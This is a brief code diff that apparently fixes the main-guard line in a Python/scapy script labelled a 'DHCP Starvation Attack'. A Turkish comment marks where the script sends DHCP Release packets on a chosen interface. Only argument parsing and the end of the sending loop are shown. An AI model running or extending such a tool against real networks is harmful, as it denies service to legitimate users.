@@ -29,7 +29,7 @@ def dhcp_starvation(interface):
         # DHCP Release paketini gönder
         sendp(dhcp_release, iface=interface, verbose=False)
 
-if _name_ == "_main_":
+if __name__ == "__main__":
     parser = argparse.ArgumentParser(description="DHCP Starvation Attack")
     parser.add_argument("-i", "--interface", type=str, help="Network interface")
     args = parser.parse_args()
